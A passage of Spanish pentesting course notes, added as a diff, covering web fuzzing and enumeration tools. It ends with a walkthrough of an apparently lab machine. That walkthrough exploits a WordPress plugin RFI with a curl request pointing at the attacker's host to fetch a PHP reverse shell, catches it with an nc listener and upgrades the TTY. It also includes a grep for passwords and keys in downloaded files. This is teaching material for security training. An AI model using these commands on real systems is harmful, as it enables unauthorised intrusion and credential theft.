@@ -374,3 +374,286 @@ A grandes rasgos, vemos cómo lanzamos un ping a la dirección IP pasada por par
 Una vez que tenemos nuestro script, le damos permisos de ejecución y lo podemos poner en alguna ruta del `PATH` para poder mencionarlo desde una ruta relativa. Por ejemplo, lo podemos mover a `/usr/bin`.
 
 ---
+
+## USO DE WFUZZ PARA HACER FUZZING
+
+### Fuzzing
+El fuzzing es la técnica utilizada para encontrar rutas dentro de un servidor web. Anteriormente, ya hemos utilizado un script de nmap para hacer fuzzing (`http-enum`), pero no es una herramienta especializada en el fuzzing. Si queremos profundizar un poco más, tendremos que utilizar otras herramientas, como `Wfuzz`.
+
+```bash
+wfuzz -c -L -t 400 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://@IP/FUZZ
+```
+
+- **Parámetros**:
+  - `-c`: Muestra el output en formato colorizado.
+  - `-L`: Sigue los redireccionamientos (`follow-redirect`), ahorrándonos los códigos 301 y mostrando el estado final de la petición (código 200).
+  - `-t`: Especifica los threads (cuántas peticiones se hacen simultáneamente).
+  - `--hc=404`: En el output no se muestran las peticiones con el código de error 404 (`hc` = `hide code`).
+  - `-w`: Especifica el diccionario a utilizar, el cual contiene muchos nombres de directorios que se probarán por fuerza bruta.
+  - El fuzzing se hace contra la dirección IP indicada y con `/FUZZ` indicamos dónde queremos que se sustituyan las palabras del diccionario.
+
+Podemos usar varios filtros al mismo tiempo, por ejemplo `--sc=200 --hl=170` (`sc` = `show code`). Hay muchos más filtros (por líneas, palabras, caracteres...) que se pueden consultar con el manual.
+
+### Fuzzing de Extensiones de Archivo con WFUZZ (Uso de Múltiples Payloads)
+Para comprobar qué tipo de archivos tiene la víctima, usamos otro diccionario:
+
+```bash
+wfuzz -c -L -t 400 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extensiones.txt https://@IP/FUZZ.FU2ZZ
+```
+
+- **Extensiones.txt**: Un archivo creado por nosotros que contiene las extensiones que queremos comprobar.
+- Con `/FUZZ.FU2ZZ`, para cada palabra del primer diccionario buscamos si tiene algunas de las extensiones del segundo diccionario.
+- `Wfuzz` cuenta con su propio User-Agent, que se puede modificar con el parámetro `-H "User-Agent: Google Chrome"`. Incluso se pueden utilizar cookies de sesión para aplicar fuzzing a recursos internos de un panel, ya estando autenticados.
+
+---
+
+## USO DE DIRBUSTER PARA HACER FUZZING
+
+`Dirbuster` tiene el mismo propósito que `Wfuzz` pero, igual que `Wireshark`, tiene una interfaz gráfica. Para abrir `Dirbuster` lo haremos del mismo modo que hacíamos con `Wireshark`:
+
+```bash
+dirbuster > /dev/null 2>&1 &
+disown
+```
+
+A modo de recordatorio, redirigimos el stderr output al `dev/null` y con `&` lo hacemos un proceso aislado a la terminal. Finalmente, para que el proceso no muera al cerrar la terminal (ya que `dirbuster` es el proceso hijo) ejecutamos `disown`.
+
+Si haciendo fuzzing encontramos, por ejemplo, un directorio con varios archivos, podemos hacer lo siguiente:
+
+```bash
+wget -r http://IP/<nombre-directorio>
+```
+
+Para descargar todos los archivos que haya en el directorio de forma recursiva. Una vez descargados todos los archivos, podemos hacer búsquedas recursivas por palabras clave para encontrar información relevante. Ejemplo:
+
+```bash
+grep -r -E -i "pass|user|key|database" | less -S
+```
+
+- **Parámetros**:
+  - `-r`: De forma recursiva.
+  - `-E`: Para diversos campos.
+  - `-i`: Sin atender a mayúsculas o minúsculas.
+  - `less -S`: Para que no haya saltos de línea y sea más legible el output.
+
+---
+
+## USO DE DIRB PARA HACER FUZZING
+
+`Dirb` es una herramienta para hacer fuzzing un poco más sencilla que las anteriores. No tiene hilos de ejecución, por lo que puede ir un poco lenta. Si no especificamos un diccionario, utilizará uno interno (el cual se muestra cuando se ejecuta la herramienta), pero este es muy pequeño, por lo que se recomienda utilizar el de `dirbuster`, por ejemplo:
+
+```bash
+dirb https://IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+---
+
+## USO DE GOBUSTER PARA HACER FUZZING
+
+`Gobuster` es una herramienta hecha en el lenguaje de programación 'Go' y trabaja muy bien con sockets y conexiones, por lo que es bastante potente. Con el comando `gobuster` se puede ver un poco de información de los parámetros que admite la herramienta, ya que en este caso no tenemos manual.
+
+```bash
+gobuster dir -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url https://IP
+```
+
+- **Parámetros**:
+  - `dir`: Modo de fuerza bruta por directorio o archivo.
+  - `-t`: Indica los hilos de ejecución.
+  - `-w`: Indica el diccionario.
+  - `--url`: Indica la dirección IP.
+
+Un punto positivo de esta herramienta es que muestra la barra de progreso, lo que nos da un tiempo estimado de ejecución.
+
+---
+
+## USO DE DIRSEARCH PARA HACER FUZZING
+
+`Dirsearch` no es una herramienta predeterminada, por lo que hay que descargarla desde GitHub. Esta herramienta permite jugar con muchos parámetros, lo que la hace muy útil y cómoda.
+
+```bash
+./dirsearch.py -u https://IP -E -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+- **Parámetros**:
+  - `-u`: Indica la URL.
+  - `-w`: Indica el diccionario.
+  - `-E`: Utiliza un diccionario de extensiones por defecto.
+
+Como vimos en `Wfuzz`, esta herramienta también permite jugar con las cookies para aplicar fuzzing a recursos internos estando ya autenticados, cambiar los headers o aplicar filtros. Es una herramienta que ofrece mucha versatilidad. `Wfuzz` y `dirsearch` son las herramientas más completas para hacer fuzzing.
+
+---
+
+## TÉCNICAS DE ENUMERACIÓN BAJO UN SERVIDOR WEB
+
+Según el gestor de contenido (WordPress, Drupal...), lo más probable es que tengamos que utilizar herramientas específicas que escanean este gestor de contenido en concreto.
+
+Un ejemplo, en una página web con un gestor de contenido WordPress, hacemos `Ctrl+U` para ver el código fuente. Si vemos que las imágenes hacen alusión a una misma dirección que es la que tiene el contenido, podemos pensar en un concepto llamado `Virtual Host Routing`, que permite contar con múltiples servidores virtuales web desde una misma máquina, en función del dominio especificado nos carga una web distinta.
+
+Ante esta situación, podemos modificar el archivo `/etc/hosts`:
+
+```plaintext
+127.0.0.1   localhost
+127.0.1.1   parrot
+
+IP         <dominio>
+```
+
+De esta forma, cualquier consulta que se realice al dominio indicado se resuelve a la IP indicada. Si podemos acceder a la dirección que tiene el contenido de las imágenes, es que se estaba haciendo uso del `Virtual Host Routing` y lo hemos explotado.
+
+Ahora nos gustaría saber si el servidor web contiene un `WAF` (Web Application Firewall). Este es un tipo de firewall que filtra o bloquea el tráfico HTTP hacia y desde la aplicación web. Podemos utilizar herramientas como `Wafw00f <ip>` para saber si la web tiene un `WAF`.
+
+Para cada gestor de contenido existen diferentes herramientas para efectuar un reconocimiento. Es nuestro trabajo buscar esas herramientas y documentarnos para aprender a utilizarlas. En este caso, estamos frente a un WordPress, por lo que podríamos utilizar `Wpscan`:
+
+```bash
+wpscan --url "http://IP" -e vp,u
+```
+
+- **Parámetros**:
+  - `--url`: Indica el dominio de la página, ya sea mediante la IP o el nombre.
+  - `-e vp,u`: Enumera plugins vulnerables (`vulnerable plugins`) y usuarios existentes en el gestor de contenido.
+
+La herramienta realiza un reconocimiento sobre el gestor de contenido y trata de informar por consola si hay vulnerabilidades potenciales. Aunque el gestor de contenido esté actualizado a su última versión, si utiliza un plugin desactualizado puede ser vulnerable. Hay muchas herramientas de reconocimiento que podemos encontrar vía internet que también hacen muy buen trabajo. Algunas son más generales, como `nikto`, `openVAS` o `nessus`, y otras más especializadas en un gestor de contenido, como ya hemos visto. 
+
+Por ejemplo, `WPSeku` es otra herramienta de escaneo para WordPress, disponible vía GitHub y su funcionamiento sería el siguiente:
+
+```bash
+python3 wpseku.py -u http://<dominio>
+```
+
+Escaneo básico, solamente especificamos la URL.
+
+---
+
+# Hackeando Nuestra Primera Máquina (RFI)
+
+Hasta este punto ya hemos visto la metodologia para enumerar puertos, servicios que corren bajo estos puertos, versiones... Con esto, detallaremos cómo un atacante puede hackear una máquina Linux con un servidor web y varios gestores de contenido. Supondremos que la IP víctima es `10.10.10.88`.
+
+## Preparativos
+
+1. **Verificar Conectividad**:
+    ```bash
+    ping -c 1 10.10.10.88
+    ```
+    Verificamos si la máquina está activa y responde. Puede que el ping esté desactivado, en cuyo caso, utilizaremos TCP o UDP.
+
+2. **Identificar Sistema Operativo**:
+    ```bash
+    whichSystem 10.10.10.88
+    ```
+    Ejecutamos un script que nos indica el sistema operativo de la víctima. En este caso, es Linux.
+
+3. **Crear Directorios de Trabajo**:
+    ```bash
+    mkdir TartaSauce
+    cd TartaSauce
+    mkt
+    ```
+    Creamos un directorio con el nombre de la máquina víctima y subdirectorios (`Content`, `exploits`, `nmap`, `scripts`, `tmp`) usando una función personalizada.
+
+## Fase de Reconocimiento
+
+1. **Escaneo de Puertos**:
+    ```bash
+    nmap -p- --open -T5 -v -n 10.10.10.88 -oG allPorts
+    extratPorts allPorts
+    ```
+    Realizamos un escaneo de todos los puertos abiertos y los exportamos en formato grepable al fichero `allPorts`. Extraemos los puertos abiertos y los copiamos al portapapeles. En este caso, solo el puerto 80 está abierto.
+
+2. **Identificación de Servicios**:
+    ```bash
+    whatweb https://10.10.10.88 2>/dev/null
+    nmap -sC -sV -p80 10.10.10.88 -oN targeted
+    ```
+    Con `whatweb`, obtenemos información relevante del servidor web. Luego, lanzamos scripts básicos de enumeración con `nmap` para averiguar la versión del servidor web y exportamos los resultados al fichero `targeted`.
+
+3. **Escaneo HTTP**:
+    ```bash
+    nmap --script http-enum -p80 10.10.10.88 -oN webScan
+    ```
+    Antes de aplicar fuzzing con herramientas especializadas, lanzamos el script `http-enum` y exportamos los resultados al fichero `webScan`.
+
+4. **Fuzzing para Encontrar Directorios**:
+    ```bash
+    wfuzz -c -L -t 400 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://10.10.10.88/webservices/FUZZ
+    ```
+    Utilizamos Wfuzz para hacer un ataque de fuerza bruta con diccionarios, apuntando al directorio `webservices` encontrado en `robots.txt`.
+
+## Acceso a WordPress
+
+1. **Escaneo de WordPress**:
+    ```bash
+    wpscan --url "https://10.10.10.88/webservices/wp/" -e vp,u
+    ```
+    Realizamos un escaneo general del gestor de contenido para enumerar plugins vulnerables y usuarios. Si no obtenemos información relevante, continuamos manualmente.
+
+2. **Fuzzing para Plugins**:
+    ```bash
+    wfuzz -c -L -t 400 --hc=404 -w wp-plugins.fuzz.txt https://10.10.10.88/webservices/wp/FUZZ
+    ```
+    Utilizamos un diccionario de plugins de WordPress (`wp-plugins.fuzz.txt`) para identificar plugins instalados.
+
+## Fase de Explotación de Vulnerabilidades
+
+1. **Buscar Exploit**:
+    ```bash
+    searchsploit gwolle
+    searchsploit -x php/webapps/38861.txt
+    ```
+    Usamos Searchsploit para buscar un exploit del plugin identificado. En este caso, encontramos un exploit de tipo Remote File Inclusion (RFI).
+
+2. **Preparar y Ejecutar el Exploit**:
+    - **Preparar Shell Reversa**:
+        ```bash
+        mv php-reverse-shell.php wp-load.php
+        ```
+    - **Compartir el Archivo PHP**:
+        ```bash
+        python -m SimpleHTTPServer 80
+        ```
+    - **Poner en Escucha**:
+        ```bash
+        nc -nlvp 443
+        ```
+    - **Lanzar Exploit**:
+        ```bash
+        curl "https://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.18"
+        ```
+        Desde un servidor web alojando `wp-load.php`, lanzamos el exploit para obtener una reverse shell.
+
+## Tratamiento de la TTY
+
+1. **Obtener Pseudo-Consola**:
+    ```bash
+    script /dev/null -c bash
+    ```
+    Lanzamos una pseudo-consola.
+
+2. **Configurar Terminal**:
+    - **Dejar en Segundo Plano**:
+        ```bash
+        Ctrl+Z
+        ```
+    - **Configurar Terminal**:
+        ```bash
+        stty raw -echo
+        fg
+        reset
+        ```
+        Introducimos `reset` y seleccionamos `xterm` como tipo de terminal.
+
+    - **Establecer Variables de Entorno**:
+        ```bash
+        export TERM=xterm
+        export SHELL=bash
+        ```
+
+3. **Ajustar Proporciones de la Terminal**:
+    ```bash
+    stty -a
+    stty rows 52 columns 187
+    ```
+    Ajustamos las proporciones de la terminal para tener una shell interactiva y cómoda.
+
+---
+
+Este proceso nos permite hackear la máquina víctima, ganar acceso no privilegiado y configurar la terminal para trabajar de forma eficiente.
